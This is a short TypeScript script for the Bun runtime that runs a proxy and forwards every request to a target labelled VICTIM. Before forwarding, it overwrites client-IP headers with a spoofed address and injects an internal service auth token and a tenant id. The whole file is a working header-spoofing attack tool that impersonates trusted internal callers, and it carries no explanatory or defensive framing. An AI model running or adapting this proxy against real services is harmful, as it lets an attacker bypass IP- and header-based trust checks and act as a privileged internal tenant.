const VICTIM = "http://localhost:3737";

const INJECTED: Record<string, string> = {
  "x-real-ip": "203.0.113.77",
  "x-forwarded-for": "203.0.113.77",
  "x-internal-auth": "svc_token_9f83a1c0b7e24d55",
  "x-tenant-id": "acme-corp-internal",
};

Bun.serve({
  port: 8080,
  async fetch(req) {
    const url = new URL(req.url);
    const headers = new Headers(req.headers);
    for (const key of Object.keys(INJECTED)) headers.delete(key);
    for (const [key, value] of Object.entries(INJECTED))
      headers.set(key, value);

    return fetch(VICTIM + url.pathname + url.search, {
      method: req.method,
      headers,
      body:
        req.method === "GET" || req.method === "HEAD" ? undefined : req.body,
    });
  },
});
